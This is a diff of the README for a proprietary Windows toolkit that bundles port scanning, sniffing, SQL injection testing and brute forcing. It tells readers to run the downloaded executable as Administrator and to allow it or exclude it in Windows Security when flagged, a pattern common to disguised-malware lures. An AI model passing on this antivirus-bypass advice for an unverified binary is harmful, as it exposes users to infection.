@@ -1,112 +1,129 @@
 UtilityMaestro
 
-Cybersecurity toolkit for network analysis and testing
+A desktop toolkit for network inspection and controlled security testing.
 
+<img src="https://github.com/user-attachments/assets/2393e7dc-6e5a-4264-8f9e-8f23372bb00a" width="1000">
+Status
 
-**Status**
+UtilityMaestro is no longer under active development.
 
-This project is not actively developed anymore.
+Development ended: October 2025
+Project is being broken into smaller, focused tools
+Only network and diagnostic tools may remain public
+Exploit-based components are not publicly distributed
 
-Development stopped around October 2025
-Parts of it are being split out into separate tools
-Network-related tools may still be released publicly
-Exploit-related tools are not public
+Last internal note (April 2026): project may return under a different name.
 
-Last note (April 2026): might continue under a different name.
+Overview
 
-What it is
+UtilityMaestro is a Windows-based GUI application that combines multiple network and security tools into a single interface.
 
-UtilityMaestro is a collection of tools I built for:
+It was built to avoid juggling separate utilities for basic tasks like:
 
-network inspection
-basic pentesting
-troubleshooting
+scanning hosts
+inspecting traffic
+testing inputs
+generating and analyzing data
 
-Everything is bundled into a single GUI app.
+This is not meant to replace professional frameworks.
+It’s a consolidated toolset for controlled environments.
 
-It’s not polished, but it works.
+Installation
+Requirements
 
-Running it
-You need one of these first:
+Install one:
+
 https://npcap.com/dist/npcap-1.81.exe
 https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe
-Steps
-Download the build
+Run
+Download the latest build
 https://github.com/IndulgeinDotNet/UtilityMaestro/releases/tag/NightDev
-Run UtilityMaestro.exe
-Use Run as admin for network tools
-Unlock:
-Code: 1234
-Check the ethics box
-If Windows blocks it
 
-This happens sometimes.
+Launch:
 
-Go to:
-
+UtilityMaestro.exe
+For full functionality:
+Run as Administrator
+Enter access code: 1234
+Accept usage agreement
 Windows Security
-Virus & threat protection
-Allow the file
 
-Or add it as an exclusion.
+Some systems will flag the executable.
 
-Main tools
+If blocked:
+
+Open Windows Security
+Go to Virus & threat protection
+Allow or exclude the file
+
+This happens due to packet handling and low-level operations.
+
+Core Modules
 Port Scanner
 
-Scans open ports (TCP / SYN / FIN).
-Used for finding exposed services.
+Scans target systems using multiple methods (TCP, SYN, FIN).
+Used for identifying exposed services and open ports.
+
+Traffic Sniffer
+
+Captures live network traffic and allows packet-level inspection.
+Useful for debugging and traffic analysis.
 
 Vulnerability Scanner
 
-Checks for common web issues:
+Performs basic checks against common web vulnerabilities:
 
 XSS
 SQL injection
-Log4Shell
-Password Cracker
+known CVE patterns
+SQL Testing Tool
 
-Brute force / dictionary attacks for:
+Sends controlled payloads to test for SQL injection behavior and response handling.
 
-MD5
-SHA1
-SHA256
-Network Sniffer
+Hash / Password Tools
 
-Captures live traffic and lets you inspect packets.
+Supports:
 
-SQL Injection Tool
+hash generation
+hash comparison
+basic brute force / dictionary testing
+Included Utilities
 
-Tests inputs against basic SQL payloads.
-
-Other tools
-
-There’s a bunch more:
+Additional tools available in the interface:
 
 DNS resolver
-hash generator
-base64 encoder
-ping tool
-packet injector
-wifi scanner
-brute forcer
-csrf tester
-xss injector
+ping utility
+base64 encoder / decoder
+file downloader
+packet sender
+WiFi scanner
+HTTP / FTP / SSH brute testing
+CSRF / XSS test tools
 
-Some things were removed or never made public.
+Some modules are disabled or removed in public builds.
 
-Use it right
+Design Notes
+Built as a single executable toolset
+GUI-focused (no CLI dependency)
+Not fully polished — functionality prioritized over UI
+Usage
 
-Don’t use this on stuff you don’t own or don’t have permission to test.
+This software is intended for:
 
-That’s it.
+personal lab environments
+authorized network testing
+learning and experimentation
+
+Do not use it against systems you do not own or have permission to test.
 
 License
 
-Not open source.
+UtilityMaestro is proprietary software.
 
-You can use the build, but you can’t redistribute it.
+Not open source
+Redistribution is not allowed
+Usage is limited under the EULA
 
-Full terms:
 https://github.com/IndulgeinDotNet/UtilityMaestro/blob/main/EULA
 
 Author
